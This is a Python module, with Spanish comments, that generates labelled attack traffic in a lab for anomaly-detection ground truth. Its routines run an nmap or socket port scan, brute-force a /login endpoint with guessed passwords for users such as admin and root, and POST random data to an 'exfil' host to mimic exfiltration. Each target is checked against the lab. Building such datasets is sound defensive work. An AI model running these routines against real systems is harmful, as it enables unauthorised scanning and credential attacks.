"""Escenarios de anomalía, lanzados desde el nodo atacante simulado SOLO contra el laboratorio.

  python -m generators.scenarios portscan  [--targets IP ...] [--ports 1-1024]
  python -m generators.scenarios bruteforce [--attempts 80] [--delay 0.3]
  python -m generators.scenarios exfil     [--files 5] [--size-mb 8]

Cada ejecución agrega su intervalo a /data/labels.jsonl (verdad de terreno).
"""
import argparse
import http.client
import json
import os
import random
import shutil
import socket
import subprocess
import time

from generators.common import (AUTH, EXFIL, FILES, WEB, assert_lab_target,
                               write_label)


def portscan(args):
    targets = args.targets or [WEB[0], AUTH[0], FILES[0]]
    for t in targets:
        assert_lab_target(t)
    lo, hi = (int(x) for x in args.ports.split("-"))
    t0 = time.time()
    for t in targets:
        if shutil.which("nmap"):
            subprocess.run(["nmap", "-sT", "-Pn", "-T4", "--max-rate", str(args.max_rate),
                            "-p", f"{lo}-{hi}", t], stdout=subprocess.DEVNULL, check=False)
        else:  # alternativa si nmap no está instalado
            for port in range(lo, hi + 1):
                s = socket.socket()
                s.settimeout(0.3)
                s.connect_ex((t, port))
                s.close()
    write_label("portscan", t0, time.time(), ",".join(targets))


def bruteforce(args):
    assert_lab_target(AUTH[0])
    users = ["alice", "bob", "carol", "admin", "root"]
    t0 = time.time()
    for i in range(args.attempts):
        body = json.dumps({"user": random.choice(users), "password": f"guess{i:04d}"})
        try:
            c = http.client.HTTPConnection(*AUTH, timeout=5)
            c.request("POST", "/login", body=body, headers={"Content-Type": "application/json"})
            c.getresponse().read()
            c.close()
        except OSError:
            break  # probablemente bloqueado por el firewall
        time.sleep(args.delay)
    write_label("bruteforce", t0, time.time(), AUTH[0], attempts=args.attempts)


def exfil(args):
    assert_lab_target(EXFIL[0])
    t0 = time.time()
    for _ in range(args.files):
        data = os.urandom(args.size_mb * 1024 * 1024)
        try:
            c = http.client.HTTPConnection(*EXFIL, timeout=30)
            c.request("POST", "/upload", body=data)
            c.getresponse().read()
            c.close()
        except OSError:
            break
        time.sleep(random.uniform(1, 3))
    write_label("exfil", t0, time.time(), EXFIL[0], files=args.files, size_mb=args.size_mb)


def main():
    ap = argparse.ArgumentParser()
    sub = ap.add_subparsers(dest="cmd", required=True)
    p = sub.add_parser("portscan")
    p.add_argument("--targets", nargs="*")
    p.add_argument("--ports", default="1-1024")
    p.add_argument("--max-rate", type=int, default=300)
    p.set_defaults(fn=portscan)
    b = sub.add_parser("bruteforce")
    b.add_argument("--attempts", type=int, default=80)
    b.add_argument("--delay", type=float, default=0.3)
    b.set_defaults(fn=bruteforce)
    e = sub.add_parser("exfil")
    e.add_argument("--files", type=int, default=5)
    e.add_argument("--size-mb", type=int, default=8)
    e.set_defaults(fn=exfil)
    args = ap.parse_args()
    args.fn(args)


if __name__ == "__main__":
    main()
